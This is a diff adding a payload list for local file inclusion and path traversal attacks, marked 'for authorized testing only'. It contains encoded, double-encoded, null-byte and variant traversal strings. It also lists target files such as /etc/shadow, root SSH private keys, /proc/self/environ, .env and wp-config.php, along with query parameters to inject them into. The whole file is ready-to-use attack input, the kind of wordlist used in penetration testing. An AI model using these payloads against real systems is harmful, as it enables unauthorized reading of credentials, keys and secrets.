@@ -1,0 +1,81 @@
+# LFI / Path Traversal Payloads
+# For authorized testing only
+
+# ── Basic Path Traversal ──────────────────────────────────────
+../../../../etc/passwd
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/hostname
+
+# ── URL Encoded ───────────────────────────────────────────────
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+
+# ── Double Encoding ───────────────────────────────────────────
+..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# ── Null Byte (legacy PHP) ────────────────────────────────────
+../../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd\0
+
+# ── Directory Traversal Variants ─────────────────────────────
+....//....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+..././..././..././etc/passwd
+..\\..\\..\\..\etc\passwd
+
+# ── Interesting Linux Files ───────────────────────────────────
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/resolv.conf
+/etc/fstab
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/maps
+/proc/version
+/proc/net/tcp
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/home/<user>/.bash_history
+/home/<user>/.ssh/id_rsa
+/root/.bash_history
+/root/.ssh/id_rsa
+
+# ── Interesting Windows Files ─────────────────────────────────
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\boot.ini
+..\..\..\windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\boot.ini
+C:\inetpub\wwwroot\web.config
+
+# ── Web Config Files ─────────────────────────────────────────
+/app/config.php
+/app/.env
+/config/database.yml
+/config/secrets.yml
+/config/settings.py
+/wp-config.php
+/sites/default/settings.php
+
+# ── Test Parameters ───────────────────────────────────────────
+# ?file=<payload>
+# ?page=<payload>
+# ?path=<payload>
+# ?document=<payload>
+# ?view=<payload>
+# ?template=<payload>
+# ?include=<payload>
+# ?doc=<payload>
+# ?filename=<payload>
